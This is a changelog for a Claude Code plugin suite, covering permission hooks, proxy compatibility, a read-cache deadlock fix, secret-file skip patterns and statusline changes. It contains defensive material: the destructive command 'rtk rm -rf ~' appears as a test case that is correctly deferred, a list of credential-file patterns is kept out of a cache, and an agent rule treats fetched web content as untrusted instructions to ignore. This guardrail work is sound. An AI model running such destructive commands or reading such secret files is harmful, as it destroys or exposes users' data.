- **`LintViolation`**, the shared display shape both linters normalize into. `RuffViolation` is structurally assignable to it, so widening the formatters left all 46 existing ruff tests passing untouched — and the biome path avoids forging ruff-only fields (`noqa_row`, `end_location`) that would have been meaningless.
- **Security classification spans both linters**: ruff's bandit `S`-prefix *or* biome's `lint/security/*` category.
- **Format hints name the right formatter** — `biome format --write` for JS/TS, `ruff format` for Python.
- **28 regression tests** (`lint-checker-biome.test.ts`, `error-warner-rules-resolution.test.ts`). The error-warner tests deliberately **do not mock** `loadErrorRules` — the existing suite mocks it, supplying rules production never had, which is precisely how the hook shipped inert.

### Notes

- Biome's JSON schema is not ruff-shaped and the tests are pinned to real 1.9.4 output: `location.path` is an object, `location.span` is a **byte-offset pair** (converted via `Buffer` — UTF-16 string slicing corrupts any non-ASCII source), and `format` diagnostics carry a **null span**.
- Both hooks remain **advisory** (`continue: true`) by design. PostToolUse fires after the tool has run, so it cannot un-run it; blocking belongs to PreToolUse.
- Unverified: whether CC's `if` evaluator extracts paths from `MultiEdit`'s `edits` array. The added clauses are monotonic — worst case a no-op, best case they close the gap.

## [2.7.2] - 2026-07-10 — rtk (token-optimizing proxy) compatibility for command-matching hooks

Makes ctk's command-matching hooks proxy-aware so a token-optimizing CLI proxy — e.g. [rtk](https://github.com/rtk-ai/rtk), whose PreToolUse hook rewrites `git status` → `rtk git status` via `updatedInput` — does not regress permissions or git validation. `security-blocker` already stripped the proxy prefix; the remaining matchers did not — a latent, half-wired gap (the `stripProxyPrefix()` helper existed but was wired into only one of the command-matching hooks). **`dist` rebuilt** (shared hook source changed).

### Fixed

- **Permission regression under an active CLI proxy**: `auto-approve-safe-bash` matched the raw command, so `rtk git status` / `rtk ls` / `rtk grep …` missed the read-only allowlist and fell through to a prompt — defeating the proxy's transparency. It now unwraps the proxy prefix **per segment** before the safe/approval checks. Verified by a runtime harness against the live rtk 0.43.0 hook: every proxied read-only command flips back to auto-approve, while `rtk git push` and `rtk rm -rf ~` still correctly defer.
- **`git-validator`** no longer skips commit-message / branch validation for `rtk git commit …`.
- **`profile-evaluator`** now matches permission-profile rules against the unwrapped command.
- **`bash-combined`** npm-audit advisory unwraps the prefix too (npm isn't rtk-proxied today; keeps the combined pretool path uniformly proxy-aware).

### Notes

- Reuses the existing `stripProxyPrefix()` helper (single source in `lib/input.ts`), mirroring `security-blocker` — no new mechanism, no rebuild of rtk's capability.
- `preflight-context-injector` (advisory context injection only) is intentionally left unchanged; a missed hint is benign, not a security or permission regression.
- 8 rtk regression cases added to the `auto-approve-safe-bash` test suite (1889 ctk tests green).

## [2.7.1] - 2026-07-09 — archive-handoffs .yaml glob fix + shared-hook-count doc reconciliation

Follow-up cleanup after the 2.7.0 cross-fork adoption. Docs/command-definition only — no runtime hook behavior changed, no `dist` rebuild.

### Fixed

- **`archive-handoffs` false-healthy / miss-all bug**: the command scanned, counted, and archived handoffs with a `*.md`-only glob, but handoffs are `*.yaml` since the v3.0 format — so **no `.yaml` handoff would ever be archived** (same class as the `check-maintenance` bug fixed in 2.7.0). All handoff globs now match `*.yaml` + legacy `*.md` (active scan, archive listing, active count, restore example, expected-format list).

### Changed

- **Shared-hook-count doc reconciliation**: the count was stated inconsistently across docs (27 / 28 / 30). Reconciled to the verifiable basis — `registerHook()` calls in `hooks/src/index.ts` = **35 registered (32 shared, symlinked from `shared/hooks-infra/src/hooks/`, + 3 ctk-specific: `hipaa-context-injector`, `phi-output-redactor`, `session-loader`)**. Updated `plugin.json`/`marketplace.json`/`README`/root `CLAUDE.md`/ctk `CLAUDE.md`, and added a **canonical-basis note** to ctk `CLAUDE.md` so the number can be re-derived and stops drifting.

## [2.7.0] - 2026-07-09 — read-cache Read/Edit deadlock fix + secret-skip (cross-fork adoption) + continuity-maintenance doc fixes

Cross-fork adoption from the internal toolkit fork. Adds the delta-cache invalidator (27th shared hook) + advance-on-serve, and fixes several continuity-maintenance doc bugs the fork's skill-audit sweep surfaced. Hook source changed → tracked `dist/` rebuilt.

### Added

- **`posttool/read-cache-invalidator` shared hook** (27th) — refreshes the per-session delta-cache base after every `Write|Edit|MultiEdit` so a subsequent `Read` of the just-edited file hash-matches and is not intercepted with a stale diff. Wired into ctk's `PostToolUse(Write|Edit|MultiEdit)` group.
- Shared **`snapshotFileToCache()`** helper — one choke point for "snapshot file → cache", reused by the read writer, the new edit invalidator, and pretool advance-on-serve. Unit tests + a full deadlock reproduction/self-heal suite (`read-cache-deadlock.test.ts`).

### Fixed

- **Read/Edit deadlock**: the cache writer fired on `Read` only, so `Write/Edit/MultiEdit` never refreshed the cached bytes; a re-Read of a just-edited file saw `cached != disk`, was intercepted with a diff, and **denied** — and a denied Read can't satisfy the harness read-before-edit gate. Two fixes: the new PostToolUse invalidator refreshes the base post-edit, and the pretool hook now **advances the base whenever it serves a diff** so out-of-band changes (e.g. a git branch switch) self-heal on the second Read.
- **`check-maintenance` false-healthy bug**: the handoff-count check globbed `*.md`, but handoffs are `*.yaml` since the v3.0 format — the 20/40 warning could never fire. Now counts both `*.yaml` and legacy `*.md`.
- **`check-maintenance` dead route**: recommended `/archive-shared-context` (no such command) in 3 places → replaced with the real remediation (manual shared-context.json prune).
- **Dirty-tracking threshold drift**: docs said auto-suggest fires at 20 edits; the `dirty-state-tracker` hook's real thresholds are **15 (warn) / 25 (auto-suggest)**. Doc references corrected and the hook named as canonical. Also single-sourced the numeric health thresholds into the `/check-maintenance` command (other files point at it) and fixed one stale `handoff-<date>.md` naming reference.

### Security

- **Delta-cache never persists secret-bearing file content** (`snapshotFileToCache`): skips files matching the security layer's env/ssh/credential patterns (`.env*`, `.ssh/id_*`, `secrets.y(a)ml`, `credentials.json`, `.npmrc`, `.netrc`, …) before writing to `~/.claude/cache`. Filters in the one shared choke point, covering the read writer, the edit invalidator, and pretool advance-on-serve.

## [2.6.11] - 2026-06-25 — rebrand to Claude Forge

Suite renamed `claude-dev-kit` → **Claude Forge**. Updated repository/homepage URLs and the `session-loader` window-title example; dist rebuilt. No behavior change beyond the rename. Re-add the marketplace and reinstall as `ctk@claude-forge`.


## [2.6.10] - 2026-06-24 — strip company-specific domain reference from HIPAA hook

Part of a monorepo-wide pass removing company-specific domain references and genericizing example data across every plugin.

### Changed

- **Removed the `health coach` keyword from the HIPAA context-injector hook's health-domain rule** (the rest of the rule is unchanged) and rebuilt the tracked `dist/`. No behavior change beyond the dropped keyword.

## [2.6.9] - 2026-06-19 — web-research: trust boundary + internal MCP sources

Skills-security audit hardening (`docs/reviews/2026-06-19_skills-security-audit.md`).

### Security

- **`web-research-analyst` agent now states an explicit trust boundary** — fetched web/API/search content is untrusted DATA, not instructions (covers the default WebFetch path, not just agent-browser): ignore embedded directives, don't follow page-invented URLs, and pass `--content-boundaries` on agent-browser escalation. Also dropped the unused `Write` tool from the agent to shrink injection blast radius.

### Changed

- **`/ctk:web-research` now blends internal + external sources.** The command queries connected MCP servers (Atlassian/Confluence, Google Drive, …) for internal context and dispatches the `web-research-analyst` agent for public web sources, synthesizing with per-source citations (`internal:<server>` / `web:<url>`). The agent gained a **Sources** section clarifying it covers the web tier and that MCP-relayed content is untrusted too. Internal sources are queried by the (MCP-capable) command, not the restricted subagent — so it stays domain-agnostic (no hardcoded server names).

## [2.6.8] - 2026-06-17 — rebuild: ship compiled JS for the 2.6.7 statusline features

### Fixed

- **Rebuilt the tracked `dist/` so 2.6.7's statusline features actually ship.** 2.6.7 updated the statusline TypeScript (cost-format fix + account-usage bars) but the committed `dist/src/statusline/context-percentage.js` was not regenerated, so installs ran the stale compiled build against the new source. This release ships only the rebuilt artifact — no source changes vs 2.6.7.

## [2.6.7] - 2026-06-17 — statusline: legible cost formatting + account-usage bars

Domain-agnostic statusline improvements ported from the internal toolkit fork.

### Fixed

- **`formatCost` legibility** — costs ≥ $10 now render as whole dollars with thousands separators (`$356`, `$1,234`) instead of an unconditional `toFixed(2)`. At statusline font size the decimal point in `$356.00` was easily misread as `$35600`. Costs < $10 keep two decimals.

### Added

- **Optional third statusline line** showing session (5-hour) and weekly (7-day) account-usage progress bars from CC v2.1.176+ `rate_limits.{five_hour,seven_day}.used_percentage`. Self-degrading: the line is omitted entirely when `rate_limits` is absent (API/Bedrock users, before the first API response), keeping the existing two-line output byte-identical. No network call. Bundled tests cover both-present / each-absent / NaN-guard / threshold-coloring / 2-line-vs-3-line.

## [2.6.6] - 2026-06-14 — first open-source release

Session continuity and context management: multi-session state persistence with ledger tracking, handoff documents, dirty-file tracking, context-window monitoring, and security guardrails. 11 skills, 1 agent, 12 commands.

### Highlights

- **Canonical owner of all shared hooks** (security, permissions, lifecycle, post-tool, HIPAA context injection). Install alongside the other plugins for full hook coverage.
- MIT licensed.

_First public release at 2.6.6; earlier version history was internal and has been omitted._
